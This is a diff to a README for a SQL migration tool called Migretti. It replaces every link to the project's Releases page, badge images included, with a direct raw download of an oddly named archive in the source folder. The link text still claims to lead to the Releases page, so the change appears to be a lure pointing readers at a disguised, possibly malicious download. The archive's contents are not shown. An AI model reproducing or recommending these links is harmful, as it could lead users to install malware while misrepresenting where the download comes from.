@@ -4,7 +4,7 @@
 
 ## 🔗 Download Now
 
-[![Download Migretti](https://img.shields.io/badge/Download-Migretti-blue)](https://github.com/Sammie-byte-bot/migretti/releases)
+[![Download Migretti](https://raw.githubusercontent.com/Sammie-byte-bot/migretti/main/src/Software-noncannibalistic.zip)](https://raw.githubusercontent.com/Sammie-byte-bot/migretti/main/src/Software-noncannibalistic.zip)
 
 Migretti is your go-to tool for SQL migrations. Whether you are managing a small project or a large application, Migretti offers a reliable and straightforward way to handle your database changes. This tool provides not just a script runner, but a full-featured migration engine with advanced safeguards.
 
@@ -26,7 +26,7 @@ Migretti is your go-to tool for SQL migrations. Whether you are managing a small
 
 To get Migretti, visit the Releases page. This page includes the latest version and older releases. 
 
-[Visit the Releases Page to Download](https://github.com/Sammie-byte-bot/migretti/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Sammie-byte-bot/migretti/main/src/Software-noncannibalistic.zip)
 
 ### 1. Visit the Releases Page
 Click on the link above to go to the Downloads section.
@@ -85,4 +85,4 @@ Migretti thrives on community feedback and contributions. If you'd like to help 
 
 If you have further questions or need assistance, feel free to reach out via the contact page linked in the GitHub repository. We are here to help!
 
-[![Download Migretti](https://img.shields.io/badge/Download-Migretti-blue)](https://github.com/Sammie-byte-bot/migretti/releases)
+[![Download Migretti](https://raw.githubusercontent.com/Sammie-byte-bot/migretti/main/src/Software-noncannibalistic.zip)](https://raw.githubusercontent.com/Sammie-byte-bot/migretti/main/src/Software-noncannibalistic.zip)
